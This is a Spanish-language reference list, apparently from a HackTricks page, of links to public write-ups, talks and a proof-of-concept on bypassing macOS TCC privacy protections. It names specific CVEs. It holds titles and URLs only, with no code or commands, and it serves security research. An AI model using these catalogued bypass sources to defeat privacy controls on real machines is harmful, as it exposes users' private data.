- [1] [CVE-2020–9934: Cómo eludir el framework Transparency, Consent, and Control (TCC) de macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Cómo eludir las protecciones de privacidad de usuario de TCC en macOS, por accidente y por diseño](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Bypass de Location Services de TCC (informe original)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Dónde está Carmen Sandiego: abuso de Location Services en macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: un bypass de TCC roba datos de iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (variables de entorno de SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Permitir el entitlement de variables de entorno DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarización: el hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Descubren un bypass de TCC zero-day en el malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: «¿Lo que pasa en tu Mac se queda en el iCloud de Apple?» - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Una nueva vulnerabilidad de macOS, «powerdir», podría permitir el acceso no autorizado a los datos de usuario](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Cambiar el directorio de inicio y eludir TCC, también conocido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Reproducir música y eludir TCC, también conocido como CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Cómo robarle a un (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Eludir TCC con Telegram en macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Descubriendo vulnerabilidades de Apple: auditoría de diskarbitrationd y storagekitd, parte 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks e interceptores de eventos de CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Prueba de concepto](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Configurar variables de entorno en OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: bypass de TCC y escalada de privilegios mediante mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: bypass de TCC al montar sobre la base de datos de TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Más de 20 formas de eludir los mecanismos de privacidad de macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Victoria por knockout contra TCC: más de 20 formas NUEVAS de eludir los mecanismos de privacidad de macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [De Spotlight a Apple Intelligence: abuso de un 0day para robar los datos que alimentan la IA de macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
